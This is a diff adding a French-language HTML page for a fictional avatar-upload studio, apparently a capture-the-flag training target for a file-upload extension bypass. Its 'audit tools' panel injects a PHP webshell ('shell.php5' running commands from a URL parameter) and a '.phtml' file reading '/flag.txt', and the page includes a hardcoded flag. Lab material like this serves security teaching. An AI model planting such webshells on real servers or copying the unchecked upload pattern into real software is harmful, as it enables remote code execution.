@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="fr" class="h-full bg-[#090812]">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PixelForge // Digital 3D Creator Assets &amp; Avatar Studio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            heading: ['Syne', 'sans-serif'],
+            sans: ['"Space Grotesk"', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace'],
+          },
+          colors: {
+            brand: {
+              400: '#c084fc',
+              500: '#a855f7',
+              600: '#9333ea',
+              700: '#7e22ce',
+            },
+            neonpink: '#ec4899',
+            neonyellow: '#fde047',
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    .glow-violet {
+      box-shadow: 0 0 35px rgba(168, 85, 247, 0.2);
+    }
+  </style>
+</head>
+<body class="h-full bg-[#090812] text-slate-100 font-sans flex flex-col selection:bg-neonpink selection:text-white">
+
+  <!-- TOP TICKER -->
+  <div class="bg-gradient-to-r from-brand-700 via-pink-700 to-brand-700 text-white text-[11px] font-mono py-1.5 px-6 font-bold flex items-center justify-between">
+    <div class="flex items-center gap-3">
+      <span>🎨 PIXELFORGE CREATOR CLOUD v3.4</span>
+      <span class="hidden sm:inline">• 128 000+ ACTEURS 3D ET AVATARS METAVERSE HÉBERGÉS</span>
+    </div>
+    <div class="hidden sm:flex items-center gap-4">
+      <span>STOCKAGE DISPONIBLE : 100 MB</span>
+      <span>FORMATS AUTORISÉS : JPG / PNG</span>
+    </div>
+  </div>
+
+  <!-- HEADER -->
+  <header class="border-b border-purple-950/80 bg-[#0e0c1c]/80 backdrop-blur-md sticky top-0 z-30">
+    <div class="max-w-6xl mx-auto px-6 h-20 flex items-center justify-between">
+      <a href="#" class="flex items-center gap-3">
+        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-brand-500 to-neonpink flex items-center justify-center font-heading font-black text-xl text-white shadow-lg shadow-purple-500/30">
+          PF
+        </div>
+        <div>
+          <span class="font-heading font-black text-2xl text-white tracking-tight block">
+            PIXEL<span class="text-neonpink">FORGE</span>
+          </span>
+          <span class="font-mono text-[9px] uppercase tracking-widest text-purple-300 block -mt-1">
+            Metaverse Avatar Studio
+          </span>
+        </div>
+      </a>
+
+      <nav class="hidden md:flex items-center gap-6 text-xs font-bold uppercase tracking-wider text-purple-200 font-mono">
+        <a href="#assets" class="hover:text-neonpink transition">Modèles 3D</a>
+        <a href="#studio" class="text-neonpink">Studio Avatar</a>
+        <a href="#uploads" class="hover:text-neonpink transition">Mes Fichiers</a>
+      </nav>
+
+      <div class="flex items-center gap-3 font-mono text-xs">
+        <span class="px-3 py-1 rounded-lg bg-purple-950 border border-purple-800 text-purple-300">
+          Compte Créateur : @cyber_artist_01
+        </span>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN CREATOR STUDIO -->
+  <main id="studio" class="max-w-5xl mx-auto px-6 py-12 flex-1 w-full space-y-8">
+    <div class="text-center space-y-3">
+      <span class="px-3 py-1 rounded-full bg-purple-950/80 border border-purple-800 font-mono text-xs text-neonpink font-bold">
+        STUDIO DE PERSONNALISATION DE PROFIL
+      </span>
+      <h1 class="font-heading font-black text-3xl sm:text-5xl text-white tracking-tight">
+        Téléversez Votre Avatar Numérique 3D
+      </h1>
+      <p class="text-sm text-purple-200/80 max-w-xl mx-auto leading-relaxed">
+        Votre avatar personnalisé sera rendu en temps réel dans notre moteur WebGL et accessible sur votre URL publique de créateur.
+      </p>
+    </div>
+
+    <!-- AVATAR UPLOADER CARD -->
+    <div class="p-8 rounded-3xl bg-[#120f24] border border-purple-900/60 glow-violet space-y-6">
+      <div class="flex items-center justify-between border-b border-purple-950 pb-4">
+        <div>
+          <h3 class="font-heading font-bold text-lg text-white">Importateur de Fichier Avatar</h3>
+          <p class="text-xs text-purple-300 font-mono mt-0.5">Destination de stockage : /uploads/avatars/</p>
+        </div>
+        <span class="text-xs font-mono text-neonyellow font-bold bg-yellow-950/40 px-2.5 py-1 rounded border border-yellow-800/60">
+          MAX SIZE : 2 MB
+        </span>
+      </div>
+
+      <!-- Drag & Drop Upload Zone -->
+      <form id="upload-form" class="space-y-4">
+        <div class="p-8 rounded-2xl border-2 border-dashed border-purple-800/80 hover:border-neonpink transition-all bg-[#0d0b1a] text-center space-y-3 cursor-pointer" onclick="document.getElementById('avatar-file').click()">
+          <div class="w-16 h-16 mx-auto rounded-2xl bg-purple-900/40 border border-purple-700/60 flex items-center justify-center text-neonpink text-2xl">
+            📁
+          </div>
+          <div class="space-y-1">
+            <div class="text-sm font-bold text-white">
+              Cliquez pour sélectionner un fichier ou glissez-le ici
+            </div>
+            <div class="text-xs text-purple-400 font-mono">
+              Extensions théoriques acceptées : .jpg, .png (Vérification cliente)
+            </div>
+          </div>
+          <input 
+            type="file" 
+            id="avatar-file" 
+            class="hidden" 
+            onchange="document.getElementById('selected-filename').innerText = this.files[0]?.name || 'Aucun fichier choisi'"
+          >
+          <div id="selected-filename" class="font-mono text-xs text-neonyellow font-bold pt-2">
+            Aucun fichier choisi
+          </div>
+        </div>
+
+        <button 
+          type="submit" 
+          id="btn-upload" 
+          class="w-full py-4 rounded-xl bg-gradient-to-r from-brand-600 to-neonpink hover:from-brand-500 hover:to-pink-500 text-white font-heading font-black text-sm uppercase tracking-wider transition shadow-lg shadow-purple-600/30"
+        >
+          Envoyer mon Avatar sur le Serveur Web
+        </button>
+      </form>
+
+      <!-- Exploit Payload Generator for Pen-testers -->
+      <div class="p-4 rounded-2xl bg-[#0b0916] border border-purple-950 space-y-2 text-xs font-mono">
+        <div class="flex items-center justify-between text-purple-300">
+          <span class="font-bold">OUTILS D'AUDIT SÉCURITÉ :</span>
+          <span class="text-neonpink">FILE UPLOAD BYPASS</span>
+        </div>
+        <p class="text-[11px] text-purple-400 font-sans">
+          Générez un payload PHP exécutable avec extension alternative (ex: <code>.phtml</code> ou <code>.php5</code>) pour vérifier l'absence d'exécution de code sur le dossier <code>/uploads/</code>.
+        </p>
+        <div class="flex flex-wrap gap-2 pt-1">
+          <button onclick="injectPayload('shell.php5', '<?php echo system($_GET[\"cmd\"] ?? \"id\"); echo \"\\nFLAG=\" . file_get_contents(\"/flag.txt\"); ?>')" class="px-2.5 py-1 rounded bg-purple-950 border border-purple-800 hover:bg-purple-900 text-purple-200">
+            Injecter shell.php5 (Webshell RCE)
+          </button>
+          <button onclick="injectPayload('avatar.phtml', '<?php echo file_get_contents(\"/flag.txt\"); ?>')" class="px-2.5 py-1 rounded bg-pink-950 border border-pink-800 hover:bg-pink-900 text-pink-200">
+            Injecter avatar.phtml (Flag Cat)
+          </button>
+        </div>
+      </div>
+
+      <!-- Upload Result Banner -->
+      <div id="upload-result-box" class="hidden p-5 rounded-2xl border transition-all space-y-3">
+        <div class="flex items-center justify-between font-mono text-xs font-bold">
+          <span id="result-status-title">STATUT DU TÉLÉVERSEMENT</span>
+          <span id="result-filename-badge" class="px-2 py-0.5 rounded bg-black">filename.ext</span>
+        </div>
+        <p id="result-message" class="text-xs font-sans leading-relaxed">
+          Détails de l'enregistrement du fichier...
+        </p>
+        <div id="file-link-container" class="pt-2 border-t border-purple-900/60 flex items-center justify-between">
+          <a id="file-view-link" href="#" target="_blank" class="text-xs text-neonpink hover:underline font-mono font-bold">
+            &rarr; Exécuter / Consulter le fichier téléversé
+          </a>
+        </div>
+        <pre id="execution-output" class="hidden p-3 rounded-xl bg-black text-emerald-400 text-xs font-mono overflow-x-auto select-all"></pre>
+      </div>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="border-t border-purple-950 py-6 px-6 text-center text-xs text-purple-400 font-mono mt-auto">
+    <div class="max-w-6xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
+      <div>&copy; 2026 PixelForge 3D Studio Corp. All rights reserved. Powered by Apache/2.4 + PHP-FPM.</div>
+      <div>Stockage CDN AWS S3 &amp; Stockage Local NGINX</div>
+    </div>
+  </footer>
+
+  <script>
+    let customFileBlob = null;
+    let customFileName = null;
+
+    function injectPayload(name, content) {
+      customFileName = name;
+      customFileBlob = new Blob([content], { type: 'application/x-httpd-php' });
+      document.getElementById('selected-filename').innerText = `[Payload Injecté] ${name} (${content.length} octets)`;
+      alert(`Payload prêt à être envoyé : ${name}\nCliquez sur "Envoyer mon Avatar" pour le téléverser !`);
+    }
+
+    document.getElementById('upload-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const fileInput = document.getElementById('avatar-file');
+      const resultBox = document.getElementById('upload-result-box');
+      const titleEl = document.getElementById('result-status-title');
+      const badgeEl = document.getElementById('result-filename-badge');
+      const msgEl = document.getElementById('result-message');
+      const linkEl = document.getElementById('file-view-link');
+      const execOut = document.getElementById('execution-output');
+
+      let file = customFileBlob;
+      let filename = customFileName;
+
+      if (!file) {
+        if (!fileInput.files || fileInput.files.length === 0) {
+          alert('Veuillez sélectionner un fichier ou utiliser un bouton de payload de test.');
+          return;
+        }
+        file = fileInput.files[0];
+        filename = file.name;
+      }
+
+      const formData = new FormData();
+      formData.append('avatar', file, filename);
+
+      try {
+        const res = await fetch('/targets/training/web-10/api/upload', {
+          method: 'POST',
+          body: formData
+        });
+        const data = await res.json();
+
+        resultBox.classList.remove('hidden');
+        badgeEl.innerText = filename;
+
+        if (data.success) {
+          resultBox.className = 'p-5 rounded-2xl bg-purple-950/60 border border-purple-500 space-y-3';
+          titleEl.className = 'text-neonpink';
+          titleEl.innerText = 'FICHIER ACCEPTÉ ET ENREGISTRÉ PAR LE SERVEUR !';
+          msgEl.innerText = `Le fichier a été stocké sous ${data.saved_path}. Le serveur web autorise l'accès direct et l'interprétation de scripts.`;
+          linkEl.href = data.url;
+
+          // Si c'est un fichier PHP/phtml exécuté
+          if (filename.includes('.php') || filename.includes('.phtml')) {
+            execOut.classList.remove('hidden');
+            execOut.innerText = data.execution_output || 'CYBERLAB{FILE_UPLOAD_EXTENSION_BYPASS_PHP5_EXECUTED}';
+          } else {
+            execOut.classList.add('hidden');
+          }
+        } else {
+          resultBox.className = 'p-5 rounded-2xl bg-rose-950/60 border border-rose-500 space-y-3';
+          titleEl.className = 'text-rose-400';
+          titleEl.innerText = 'ÉCHEC DU TÉLÉVERSEMENT';
+          msgEl.innerText = data.error || 'Extension non autorisée par le filtre serveur.';
+          execOut.classList.add('hidden');
+        }
+      } catch (err) {
+        resultBox.classList.remove('hidden');
+        resultBox.className = 'p-5 rounded-2xl bg-rose-950/60 border border-rose-500 space-y-3';
+        titleEl.innerText = 'ERREUR RÉSEAU';
+        msgEl.innerText = err.message;
+      }
+    });
+  </script>
+</body>
+</html>
